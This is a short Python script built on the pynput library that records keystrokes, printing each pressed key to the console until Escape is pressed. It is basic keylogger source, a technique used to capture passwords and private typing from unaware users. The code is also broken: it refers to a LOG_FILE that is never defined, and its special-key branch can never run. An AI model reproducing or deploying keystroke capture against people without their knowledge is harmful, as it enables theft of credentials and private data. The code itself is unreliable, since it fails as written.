from pynput import keyboard

# Define the log file path


def on_press(key):
    """Callback function for key presses."""
    try:
        # Log alphanumeric keys directly
        print(key)
    except AttributeError:
        # Log special keys (e.g., Space, Enter, Shift)
        if key == keyboard.Key.space:
            print(" ")
        elif key == keyboard.Key.enter:
            print("\n")
        else:
            print(f"[{key.name}]")  # Log the name of the special key


def on_release(key):
    """Callback function for key releases."""
    # Stop the listener if the Escape key is pressed
    if key == keyboard.Key.esc:
        return False


# Create a listener for keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"Key logging stopped. Check '{LOG_FILE}' for recorded keys.")
